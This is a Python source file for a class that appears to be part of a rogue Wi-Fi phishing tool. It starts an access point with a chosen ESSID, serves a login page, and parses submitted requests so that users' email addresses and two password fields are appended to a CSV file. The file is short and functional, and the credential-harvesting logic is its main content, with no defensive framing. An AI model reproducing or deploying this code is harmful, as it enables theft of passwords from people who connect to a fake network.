# -*- coding: utf-8 -*-


class CaptivePortal:

  def __init__(self, tools, config):
    self.tools = tools
    self.essid = config['essid']
    self.web_page = self.get_page()

  def get_page(self):
    with open('data/captive_portal/page.html') as f:
      return f.read()

  def log_credentials(self, request):
    request_data = request.split('a=')[1]
    parameters = request_data.split('&')
    email = parameters[0].replace('%40', '@')
    pass1 = parameters[1].replace('b=', '')
    pass2 = parameters[2].replace('c=', '')
    entry = '%s,%s,%s\n' % (email, pass1, pass2)
    with open('data/captive_portal/log.csv', 'a') as f:
      f.write(entry)

  def start(self):
    self.tools.start_ap(self.essid)
    self.tools.start_server(
      'PORTAL',
      self.web_page,
      self.log_credentials
    )
